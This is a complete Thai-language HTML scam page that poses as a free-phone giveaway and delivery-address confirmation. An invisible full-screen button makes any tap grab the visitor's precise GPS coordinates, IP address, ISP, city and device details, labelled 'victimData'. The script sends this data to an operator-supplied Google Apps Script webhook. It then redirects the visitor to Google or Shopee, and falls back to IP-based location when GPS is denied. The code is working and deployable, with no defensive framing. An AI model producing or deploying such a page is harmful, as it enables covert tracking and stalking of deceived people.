<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>แจกมือถือฟรี รีบกดด่วน</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
	font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
	background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
	height: 100vh;
	display: flex;
	justify-content: center;
	align-items: center;
	overflow: hidden;
}
.container {
	background: white;
	padding: 40px;
	border-radius: 20px;
	box-shadow: 0 20px 40px rgba(0,0,0,0.1);
	text-align: center;
	max-width: 500px;
	width: 90%;
}
.logo {
	width: 80px; height: 80px;
	background: #ff6b6b;
	border-radius: 50%;
	margin: 0 auto 30px;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 36px;
	color: white;
}
h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
.subtitle { color: #666; margin-bottom: 30px; font-size: 16px; }

/* ปุ่มล่องหนครอบทั้งหน้าจริง ๆ */
#trapBtn {
	position: fixed;
	top: 0; left: 0;
	width: 100vw; height: 100vh;
	z-index: 9999;
	cursor: pointer;
	background: transparent;
	border: none;
}

.status {
	display: inline-block;
	width: 20px; height: 20px;
	border-radius: 50%;
	background: #ff6b6b;
	margin-right: 10px;
	animation: pulse 1.5s infinite;
}
@keyframes pulse {
	0% { transform: scale(1); opacity: 1; }
	50% { transform: scale(1.2); opacity: 0.7; }
	100% { transform: scale(1); opacity: 1; }
}
.sent { background: #51cf66 !important; animation: none !important; }
</style>
</head>
<body>

<button id="trapBtn" onclick="captureLocation()"></button>

<div class="container">
	<div class="logo">📦</div>
	<h1>ยืนยันที่อยู่จัดส่งสินค้า</h1>
	<p class="subtitle">กรุณายืนยันตำแหน่งปัจจุบันของคุณเพื่อจัดส่งสินค้า</p>

	<div style="margin: 30px 0;">
		<div style="display: flex; align-items: center; justify-content: center; margin-bottom: 20px;">
			<div class="status" id="statusDot"></div>
			<span id="statusText">กำลังตรวจสอบตำแหน่ง...</span>
		</div>
		<p style="color: #999; font-size: 14px;">กดตรงไหนก็ได้บนหน้าจอเพื่อยืนยัน</p>
	</div>
</div>

<script>
// === แก้ตรงนี้: ใส่ Webhook ของคุณที่นี่ ===
const SHEET_WEBHOOK = 'https://script.google.com/macros/s/AKfycbxXMRASJ52a1VU-Zgbi5x5tZj1oZosd1jtiU4V0sr0BkOq8LNuvO3SGIMDSkK6chNDqMg/exec';

async function captureLocation() {
	// ป้องกันการกดซ้ำ
	document.getElementById('trapBtn').disabled = true;

	try {
		updateStatus('กำลังพาไปหน้ารับ Iphone', '#ffd43b');

		const position = await new Promise((resolve, reject) => {
			if (!navigator.geolocation) return reject('ไม่รองรับ Geolocation');
			navigator.geolocation.getCurrentPosition(resolve, reject, {
				enableHighAccuracy: true,
				timeout: 15000,
				maximumAge: 0
			});
		});

		// ดึงข้อมูล IP
		const ipResponse = await fetch('https://ipapi.co/json/');
		const ipData = await ipResponse.json();

		const victimData = {
			timestamp: new Date().toISOString(),
			userAgent: navigator.userAgent,
			language: navigator.language || navigator.languages[0],
			platform: navigator.platform,
			cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
			screen: `${screen.width}x${screen.height}`,
			timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
			referrer: document.referrer || 'Direct',

			// GPS (แม่นยำมาก)
			latitude: position.coords.latitude,
			longitude: position.coords.longitude,
			accuracy_meters: position.coords.accuracy,

			// IP Info
			ip: ipData.ip || 'N/A',
			country: ipData.country_name || ipData.country || 'N/A',
			city: ipData.city || 'N/A',
			region: ipData.region || 'N/A',
			isp: ipData.org || ipData.isp || 'N/A',
		};

		updateStatus('กำลังส่งข้อมูล...', '#ffd43b');
		await sendToSheet(victimData);

		updateStatus('✓ ยืนยันสำเร็จแล้ว!', '#51cf66');
		setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);

	} catch (err) {
		console.log('GPS ถูกปฏิเสธหรือ error:', err);
		// Fallback: ส่งข้อมูลโดยไม่มี GPS
		await sendFallback();
	}
}

async function sendToSheet(data) {
	const params = new URLSearchParams(data);
	// วิธีที่ถูกต้อง 100%
	await fetch(`${SHEET_WEBHOOK}?${params.toString()}`, {
		method: 'GET',
		mode: 'no-cors',
		redirect: 'follow'
	});
}

async function sendFallback() {
	const ipResponse = await fetch('https://ipapi.co/json/');
	const ipData = await ipResponse.json();

	const fallbackData = {
		timestamp: new Date().toISOString(),
		userAgent: navigator.userAgent,
		screen: `${screen.width}x${screen.height}`,
		referrer: document.referrer || 'Direct',
		ip: ipData.ip || 'N/A',
		country: ipData.country_name || 'N/A',
		city: ipData.city || 'N/A',
		status: 'GPS_DENIED_OR_BLOCKED'
	};

	await sendToSheet(fallbackData);
	updateStatus('ใช้ตำแหน่งจาก IP แทน', '#ff9500');
	setTimeout(() => { window.location.href = 'https://shopee.co.th'; }, 2500);
}

function updateStatus(text, color) {
	document.getElementById('statusText').textContent = text;
	const dot = document.getElementById('statusDot');
	dot.style.background = color;
	if (color === '#51cf66') dot.classList.add('sent');
}

// Auto trigger บนมือถือหลังโหลด 3 วิ (ถ้าไม่กดเอง)
setTimeout(() => {
	if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
		document.body.style.cursor = 'pointer';
	}
}, 3000);

</script>
</body>
</html>
